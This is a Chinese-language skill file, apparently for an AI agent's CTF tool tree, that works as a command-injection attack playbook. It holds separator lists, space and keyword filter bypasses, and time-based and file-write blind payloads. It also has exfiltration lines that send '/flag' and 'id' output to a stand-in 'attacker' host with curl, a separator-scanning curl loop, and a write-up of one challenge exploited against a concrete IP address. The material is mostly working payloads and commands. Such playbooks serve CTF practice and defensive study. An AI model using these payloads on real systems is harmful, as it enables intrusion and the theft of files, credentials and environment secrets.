---
name: ctf-web-cmdi
description: CTF 命令注入 攻击 playbook。识别/触发指纹：命令注入 / command injection / OS命令执行 / ;id / |whoami / 反引号 / $() / %0a换行 / ping注入 / system / exec / os-shell / shell_exec / passthru / 反弹 / RCE。碰到 ping/host/ip 参数拼接系统命令、回显或延迟差、sh: unknown host 报错、源码里 system()/exec()/eval($_GET) 调用、;id 与 |whoami 出 uid 等场景，由二级 ctf-web 路由表调用本 leaf，专项解决"这个考点怎么打"。
---

# CTF 命令注入 解题 playbook

> **定位**：CTF skill 树三级 leaf（知识锚点）。由二级 `ctf-web` 路由表按识别特征调用；本文件只讲"这个考点怎么打"，不重复工作流。
> **CTF 原则**：拿 flag 即止、不写修复、不臆想、区分确认与推测。靶机常不出网 → 优先本地回显（error/回显/文件读/时间盲注），OOB 回连（DNS exfil / UNC / curl attacker.com）在 CTF 通常用不上，提及仅作概念。

## 识别特征（什么时候调我）
- **黑盒-参数指纹**：`ping` / `host` / `ip` / `target` / `cmd` / `domain` 参数被拼进系统命令；输入后页面回显 ping 统计、DNS 解析、执行时长差异。
- **黑盒-分隔符试探**：`127.0.0.1;id`、`127.0.0.1|whoami`、`` 127.0.0.1`id` ``、`$(id)` 出现 `uid=` / 用户名；或 `sh: xxx: command not found`、`ping: unknown host` 报错。
- **白盒-sink**：源码出现 `system()` / `exec()` / `shell_exec()` / `passthru()` / `popen()` / 反引号 / `eval($_GET[...])` / `Runtime.exec` / `subprocess(os)` / 模板里的 `os-shell`。
- **过滤型**：题目提示"过滤了特殊字符"、长度限制、IP 正则校验 —— 命中即转入"黑名单绕过"小节。

## 核心攻击手法

### 1. 命令分隔符全集（先试这套，命中即拿 RCE）
```
;          顺序执行第二条
|          管道：后者输出替代前者
||         前者失败才执行后者
&          后台分隔（等价命令分隔符）
&&         前者成功才执行后者
`cmd`      反引号：命令替换
$(cmd)     美元括号：命令替换
%0a %0d    换行 / 回车 —— 当 ;|& 被过滤时的最后一招（CRLF 式分隔）
```
典型 payload：`ip=127.0.0.1;id` / `ip=127.0.0.1|id` / `ip=127.0.0.1%0aid`。

### 2. 空格绕过（空格被过滤）
```
${IFS}     IFS 默认 = 空格+tab+换行，最常用
$IFS
{cat,/flag}    花括号展开（Bash brace expansion）
cat</flag      输入重定向顶替空格
X=$'\x20';     变量拼出空格
```

### 3. 关键字/字母数字绕过（无字母数字 webshell、`cat`/`flag` 被禁）
```
ca\t           反斜杠插断关键字
c'a't / c"a"t  引号插入（sh 忽略引号）
/???/??t       glob 通配符（/bin/cat → /???/??t，/etc/passwd → /???/??????）
$0             sh 重新调用自身（无字母数字核心手法）
$(printf '\x63\x61\x74')   十六进制拼命令
${PATH:0:1}    子串提取造字符
```

### 4. 盲注（无回显，CTF 靶机常不出网 → 优先本地路径）
```
# 时间盲注：看响应延迟
;sleep 5      或  |sleep 5
# 写文件后用同站读出（LFI / 路由 / 静态目录）
;ls /> /var/www/html/upload/o.txt
;cat /flag > /var/www/html/upload/o.txt
# OOB 回连（概念，CTF 靶机常不出网，别指望）
;curl http://attacker/$(id | base64)
;curl http://attacker/$(cat /flag)
```

### 5. flag 落点探测（命令一打通就按这个顺序找）
```
env; printenv          # 容器题 flag 常在环境变量 GZCTF_FLAG / FLAG
cat /flag /flag.txt /flag.php /home/*/flag*
find / -name 'flag*' 2>/dev/null
ls -la / ; ls -la /root /home
```

## CTF 实战结晶

### file-upload-lfi (TopSecCTF 2026-07-31) — ping `%0a` 换行注入 + 环境变量 flag
**链路**：LFI(`php://filter` 读源码) → 审计 `ping.php` 黑名单 → `%0a` 换行绕过分隔符 → `env` 取 `GZCTF_FLAG`。

`ping.php` 过滤正则：
```php
preg_match("/[\`;$()| \/\'>\"\t]/", $ip)   // 黑名单：` ; $ ( ) | 空格 / ' " tab
strlen($ip) > 13                            // 长度 ≤ 13
// IP 正则只锚定开头、不锚定结尾；未过滤 & \n(%0a) < >
```
关键 payload（10 字符，满足长度，换行作分隔符，IP 正则通过）：
```
ping.php?ip=0.0.0.0%0als       # 列目录，确认 RCE
ping.php?ip=0.0.0.0%0aenv      # 输出 GZCTF_FLAG=flag{...}
```
```bash
T=http://38.55.146.39:32903
curl -s "$T/ping.php?ip=0.0.0.0%0aenv" | sed -n '/<pre>/,/<\/pre>/p'
```
**结晶要点**：
1. 当 `;|&$()` 全被过滤时，**换行 `%0a` / `%0d` 是保底的命令分隔符** —— 黑名单漏 `%0a` 是最高频考点。
2. IP/host 正则**只锚定开头不锚定结尾** + 长度限制宽松 = 典型绕过面（`0.0.0.0%0a...` 前段过正则，后段自由）。
3. flag 优先查**环境变量**（`GZCTF_FLAG`/`FLAG`），再查 `/flag`、`/flag.php`。本题 flag 不在 `flag.php` / `contain.html`，只在 `env`。
4. 本题上传链（`getimagesize` 弱校验）未实际使用 —— 命令注入直达 flag，说明**别一上来死磕上传，命令注入往往是更短路径**。

## 工具命令
```bash
T=http://target:port
# 1) 黑盒扫分隔符（线程低、字典小，CTF 容器轻量别高并发）
for s in ';' '|' '||' '&' '&&' '`' '$()' '%0a' '%0d'; do
  echo "== $s =="
  curl -s "$T/ping.php?ip=127.0.0.1${s}id" | grep -i 'uid=\|command not found'
done
# 2) 配合 LFI 读源码定 sink
curl -s "$T/you_find_upload.php?p=php://filter/convert.base64-encode/resource=ping" | base64 -d
# 3) RCE 一打通立即取 flag（env 优先）
curl -s "$T/ping.php?ip=0.0.0.0%0aenv" | sed -n '/<pre>/,/<\/pre>/p'
# 4) 长度受限时短 payload：0.0.0.0%0als / 0.0.0.0%0aid / 1.1.1.1%0aenv
```

## 深度参考（穷尽技巧时加载）
- hack-skills-main/skills/cmdi-command-injection/SKILL.md（分隔符/IFS/无字母数字全集）
- hack-skills-main/skills/401-403-bypass-techniques（WAF / 关键字过滤绕过）
- hack-skills-main/skills/expression-language-injection（EL 注入边界：模板 vs 系统调用）

## 关联 leaf
- `ctf-web-lfi`（LFI 读源码审计 → 定位命令注入 sink；**file-upload-lfi 链**：LFI → 源码 → ping cmdi）
- `ctf-web-ssti`（模板注入同样可达 RCE，区分边界：注入点在模板引擎 vs 系统调用）
- `ctf-web-ssrf` / `ctf-web-deser`（**Fakebook 链**：ctf-web-sqli → ctf-web-deser → ctf-web-ssrf，RCE 常作为链尾）
- `ctf-web-xxe`（XXE 的 expect:// wrapper 也可触发命令执行，与 cmdi 互通）
